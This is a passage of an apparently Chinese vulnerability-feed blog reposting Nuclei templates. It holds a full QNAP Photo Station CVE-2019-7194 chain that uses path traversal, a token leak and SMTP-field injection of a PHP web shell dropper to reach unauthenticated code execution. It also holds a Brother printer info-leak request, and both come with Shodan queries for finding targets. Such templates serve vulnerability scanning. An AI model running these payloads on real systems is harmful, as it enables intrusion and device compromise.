True</h4><h4 id="Shodan-Query-cpe-cpe-2-3-o-debian-debian-linux"><a href="#Shodan-Query-cpe-cpe-2-3-o-debian-debian-linux" class="headerlink" title="Shodan Query: cpe:&quot;cpe:2.3:o:debian:debian_linux&quot;"></a>Shodan Query: <code>cpe:&quot;cpe:2.3:o:debian:debian_linux&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FasterXML jackson-databind 反序列化漏洞&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>QNAP Photo Station 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/27/github_3052816480/"/>
    <id>http://example.com/2025/06/27/github_3052816480/</id>
    <published>2025-06-27T01:45:18.360Z</published>
    <updated>2025-06-27T01:45:18.359Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> QNAP Photo Station 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-7194</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QNAP Photo Station 6.0.3之前的版本存在多个漏洞，当这些漏洞被串联利用时，可实现未经身份验证的远程代码执行（RCE）。这包括一个涉及文件名或路径外部控制的缺陷，允许攻击者访问或修改敏感的系统文件。为了降低这些风险，QNAP强烈建议将Photo Station更新到最新可用版本。</p><p><strong>产品厂商：</strong> qnap</p><p><strong>产品名称：</strong> photo_station</p><p><strong>影响版本：</strong> * &lt; 6.0.3</p><p><strong>搜索语法：</strong> title&#x3D;”photo station” | title&#x3D;”qnap”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/57e42dff4deed2cb38632bf4108674780974a7f2/http%2Fcves%2F2019%2FCVE-2019-7194.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/57e42dff4deed2cb38632bf4108674780974a7f2/http%2Fcves%2F2019%2FCVE-2019-7194.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7194</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> QNAP Photo Station <span class="hljs-operator">&lt;</span> <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> x-stp<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    QNAP Photo Station versions prior to <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE).<br>    This includes a flaw involving external control of file names <span class="hljs-keyword">or</span> paths, allowing attackers to access <span class="hljs-keyword">or</span> modify sensitive system files.<br>    To mitigate these risks, QNAP strongly recommends updating Photo Station to the latest available versions.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/ARPSyndicate/cvemon</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/Ostorlab/KEV</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/cyb3r-w0lf/nuclei-template-collection</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/xbl3/awesome-cve-poc_qazbnm456</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7194</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">22</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.89163</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99497</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:qnap:photo_station:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">vendor:</span> qnap<br>    <span class="hljs-params">product:</span> photo_station<br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> content-length:<span class="hljs-string">&quot;580 &quot;</span>http server <span class="hljs-number">1.0</span><span class="hljs-string">&quot;&quot;</span><br>      <span class="hljs-operator">-</span> http.title:<span class="hljs-string">&quot;photo station&quot;</span><br>      <span class="hljs-operator">-</span> http.title:<span class="hljs-string">&quot;qnap&quot;</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;photo station&quot;</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;qnap&quot;</span><br>    <span class="hljs-params">google-query:</span><br>      <span class="hljs-operator">-</span> intitle:<span class="hljs-string">&quot;photo station&quot;</span><br>      <span class="hljs-operator">-</span> intitle:<span class="hljs-string">&quot;qnap&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2019,qnap,rce,photostation,unauth,injection,lfi,kev,intrusive<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">command_payload:</span> &#x27;%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>d%<span class="hljs-number">60</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>Bx%<span class="hljs-number">5</span>D%<span class="hljs-number">60</span>%<span class="hljs-number">3</span>f%<span class="hljs-number">3</span>e%<span class="hljs-number">40</span>s.tp&#x27;<br>  <span class="hljs-params">dropper_command:</span> <span class="hljs-string">&quot;x= echo $((0x2C06*1337))&quot;</span><br>  <span class="hljs-params">dropper_filename:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alpha(6))&#125;&#125;&quot;</span><br>  <span class="hljs-params">username:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alphanumeric(6))&#125;&#125;&quot;</span><br>  <span class="hljs-params">email_account:</span> <span class="hljs-string">&quot;&#123;&#123;username&#125;&#125;@&#123;&#123;to_lower(rand_text_alphanumeric(6))&#125;&#125;.com&quot;</span><br>  <span class="hljs-params">email_passwd:</span> <span class="hljs-string">&quot;&#123;&#123;rand_text_alphanumeric(12)&#125;&#125;&quot;</span><br><br><span class="hljs-params">flow:</span> |<br>  http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">3</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">4</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">5</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">6</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">7</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/photo/p/api/album.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">a</span><span class="hljs-operator">=</span>setSlideshow&amp;f<span class="hljs-operator">=</span>qsamplealbum<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> album_id<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;output&gt;([a-zA-Z0-9]+)&lt;/output&gt;&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>photo<span class="hljs-operator">/</span>slideshow.php<span class="hljs-operator">?</span>album<span class="hljs-operator">=</span>&#123;&#123;album_id&#125;&#125; HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> access_code<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;encodeURIComponent<span class="hljs-char escape_">\\</span>(&#x27;([A-Za-z0-9%]+)&#x27;<span class="hljs-char escape_">\\</span>)&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">name:</span> phpsessid<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;PHPSESSID=([a-z0-9]+);&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/photo/p/api/video.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">a</span><span class="hljs-operator">=</span>caption&amp;f<span class="hljs-operator">=</span>UMGObv&amp;album<span class="hljs-operator">=</span>&#123;&#123;album_id&#125;&#125;&amp;ac<span class="hljs-operator">=</span>&#123;&#123;access_code&#125;&#125;&amp;filename<span class="hljs-operator">=</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>Multimedia<span class="hljs-operator">/</span>.@__thumb<span class="hljs-symbol">/ps.app.token</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> app_token<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;([a-f0-9]&#123;32&#125;)&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/cgi-bin/authLogin.cgi</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">app</span><span class="hljs-operator">=</span>PHOTO_STATION&amp;auth<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;app_token<span class="hljs-operator">=</span>&#123;&#123;app_token&#125;&#125;<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">name:</span> nas_sid<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-symbol">&lt;authSid&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>\[CDATA\[([a-z0-<span class="hljs-number">9</span>]<span class="hljs-operator">+</span>)\]\]<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>authSid<span class="hljs-operator">&gt;</span>&#x27;<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>userConfig.cgi<span class="hljs-operator">?</span>sid<span class="hljs-operator">=</span>&#123;&#123;nas_sid&#125;&#125; HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br>        <span class="hljs-params">X-Requested-With:</span> XMLHttpRequest<br><br>        <span class="hljs-attr">func</span><span class="hljs-operator">=</span>addPersonalSmtp&amp;provider_idx<span class="hljs-operator">=</span><span class="hljs-number">0</span>&amp;sender<span class="hljs-operator">=</span>&#123;&#123;command_payload&#125;&#125;&amp;default<span class="hljs-operator">=</span><span class="hljs-number">0</span>&amp;smtp_server<span class="hljs-operator">=</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>&amp;port<span class="hljs-operator">=</span><span class="hljs-number">25</span>&amp;security<span class="hljs-operator">=</span><span class="hljs-operator">-</span><span class="hljs-number">1</span>&amp;email_account<span class="hljs-operator">=</span>&#123;&#123;email_account&#125;&#125;&amp;email_passwd<span class="hljs-operator">=</span>&#123;&#123;email_passwd&#125;&#125;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>photo<span class="hljs-operator">/</span>slideshow.php<span class="hljs-operator">?</span>album<span class="hljs-operator">=</span>qsamplealbum HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Cookie:</span> QMS_SID<span class="hljs-operator">=</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>mnt<span class="hljs-operator">/</span>ext<span class="hljs-operator">/</span>opt<span class="hljs-operator">/</span>photostation2<span class="hljs-operator">/</span>&#123;&#123;dropper_filename&#125;&#125;.php; <span class="hljs-attr">PHPSESSID</span><span class="hljs-operator">=</span>&#123;&#123;phpsessid&#125;&#125;; <span class="hljs-attr">NAS_SID</span><span class="hljs-operator">=</span>&#123;&#123;nas_sid&#125;&#125;; <span class="hljs-attr">DESKTOP</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>; <span class="hljs-attr">CACHE</span><span class="hljs-operator">=</span>&#123;&#123;randstr&#125;&#125;;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>photo<span class="hljs-operator">/</span>&#123;&#123;dropper_filename&#125;&#125;.php HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>        <span class="hljs-params">Cookie:</span> PHPSESSID<span class="hljs-operator">=</span>&#123;&#123;phpsessid&#125;&#125;; <span class="hljs-attr">NAS_SID</span><span class="hljs-operator">=</span>&#123;&#123;nas_sid&#125;&#125;<br><br>        &#123;&#123;dropper_command&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;NASVARS&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-number">15067990</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP Photo Station 远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;str</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Brother MFC-L9570CDW 信息泄露漏洞</title>
    <link href="http://example.com/2025/06/27/github_549051398/"/>
    <id>http://example.com/2025/06/27/github_549051398/</id>
    <published>2025-06-27T01:15:14.174Z</published>
    <updated>2025-06-27T01:15:14.172Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Brother MFC-L9570CDW 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-51977</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 未经身份验证的攻击者可以访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），从易受攻击的设备泄露多段敏感信息。通过GET请求可以访问URI路径&#x2F;etc&#x2F;mnt_info.csv，且无需身份验证。返回的结果是一个逗号分隔值（CSV）信息表。泄露的信息包括设备的型号、固件版本、IP地址和序列号。</p><p><strong>产品厂商：</strong> Brother</p><p><strong>产品名称：</strong> MFC-L9570CDW</p><p><strong>搜索语法：</strong> html:”MFC-L9570CDW”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/0cbb831273949aa1c08c97675cda71d91a7c3ef3/http%2Fcves%2F2024%2FCVE-2024-51977.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/0cbb831273949aa1c08c97675cda71d91a7c3ef3/http%2Fcves%2F2024%2FCVE-2024-51977.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">51977</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Brother MFC-L9570CDW <span class="hljs-operator">-</span> Information Disclosure<br>  <span class="hljs-params">author:</span> DhiyaneshDK<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    An unauthenticated attacker who can access either the HTTP service (TCP port <span class="hljs-number">80</span>), the HTTPS service (TCP port <span class="hljs-number">443</span>), <span class="hljs-keyword">or</span> the IPP service (TCP port <span class="hljs-number">631</span>), can leak several pieces of sensitive information from a vulnerable device. The URI path <span class="hljs-symbol">/etc/mnt_info.csv</span> can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the device’s model, firmware version, IP address, and serial number.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/sfewer-r7/BrotherVulnerabilities/blob/main/CVE-2024-51977.rb</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> html:<span class="hljs-string">&quot;MFC-L9570CDW&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,printer,info-disclosure<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/etc/mnt_info.csv</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;Model Name&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;IP Address&quot;</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> content_type<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;text/comma-separated-values&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Brother MFC-L9570CDW 信息泄露漏洞&lt;/p&gt;
&lt;p&gt;&lt;str</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>Missing Authentication for Critical Function vulnerability in Mitsubishi Electric Corporation G</title>
    <link href="http://example.com/2025/06/27/github_2480436226/"/>
    <id>http://example.com/2025/06/27/github_2480436226/</id>
    <published>2025-06-27T01:00:06.416Z</published>
    <updated>2025-06-27T01:00:06.415Z</updated>
    
